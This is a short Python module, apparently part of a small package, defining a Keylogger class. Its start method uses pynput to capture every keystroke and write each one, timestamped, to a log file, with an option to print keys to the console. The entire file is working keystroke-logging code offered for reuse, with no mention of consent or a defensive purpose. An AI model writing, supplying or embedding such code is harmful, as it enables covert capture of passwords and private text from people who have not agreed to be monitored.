from .errors import *
import logging
from pynput.keyboard import Key, Listener

class Keylogger:
    r"""A class that implements Keylogger function
    -----------
    Classmethod :
    - start
    """
    
    @classmethod
    def start(self, logfile_path:str=None, allow_print=False):
        r"""Start Keylogger
        -----------
        Paramaters :
        - logfile_path: `str` | Log file path (txt)
        - allow_pint: `True/False` | Allow print at console? (Default: False)
        """
        if logfile_path == None:
            raise CannotNone("logfile_path")
        
        print("Ready!")
        logging.basicConfig(filename=logfile_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")

        def on_press(key):
            logging.info(str(key))
            if allow_print == True:
                print(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()
